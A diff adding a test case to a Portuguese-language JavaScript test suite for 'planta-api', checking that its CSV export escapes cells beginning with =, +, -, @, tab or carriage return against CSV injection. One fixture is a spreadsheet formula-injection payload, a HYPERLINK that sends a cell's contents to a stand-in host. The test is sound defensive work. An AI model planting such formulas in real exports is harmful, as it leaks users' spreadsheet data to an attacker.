@@ -63,6 +63,14 @@ describe('planta-api (E9.2)', () => {
     expect(linhas).toEqual(['## Totais', 'Grandeza;Valor', 'Área de piso (m²);12,5', 'Paredes;5', 'Obs;"tem; ponto e vírgula"', 'Aspas;"diz ""oi"""', 'Vazio;', '', '## Ambientes', 'Nome;m²', 'Sala;20,1235', '']);
   });
 
+  it('CSV: texto que começa com = + - @ tab ou CR ganha \' na frente (CSV injection); número negativo continua número', () => {
+    const csv = csvDasAbas([
+      { nome: 'Ambientes', linhas: [['=HYPERLINK("https://x.example/?d="&B3;"Ver")', -12.5], ['+1', -3], ['-2', 0], ['@SUM(A1)', 1.5], ['\tx', 'Sala - 1'], ['\rx', 'a=b']] },
+    ]);
+    const linhas = csv.slice(1).split('\r\n');
+    expect(linhas).toEqual(['## Ambientes', '"\'=HYPERLINK(""https://x.example/?d=""&B3;""Ver"")";-12,5', "'+1;-3", "'-2;0", "'@SUM(A1);1,5", "'\tx;Sala - 1", '"\'\rx";a=b', '']);
+  });
+
   it('OpenAPI 3.1: 7 rotas GET, todas exigindo o token da organização, com os derivados marcados; a documentação em Markdown lista cada rota e a autenticação', () => {
     const spec = openapi('https://x.supabase.co/functions/v1/planta-api');
     expect(spec.openapi).toBe('3.1.0');
